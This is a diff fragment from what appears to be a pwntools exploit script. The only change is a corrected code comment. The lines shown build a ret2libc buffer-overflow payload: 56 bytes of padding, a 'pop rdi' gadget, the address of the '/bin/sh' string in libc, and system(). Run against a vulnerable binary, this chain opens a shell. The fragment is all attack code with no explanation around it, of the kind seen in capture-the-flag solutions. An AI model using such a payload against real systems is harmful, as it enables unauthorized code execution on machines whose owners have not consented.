@@ -37,7 +37,7 @@ binsh_addr = next(libc.search("/bin/sh\x00"))
 
 payload2 = flat(
     'A'*56,
-    rdi, # actually already stack alignment in here, so go went using rdi instead directly
+    rdi, # actually already stack alignment in here, so go using rdi instead directly
     binsh_addr, 
     system_addr
 )
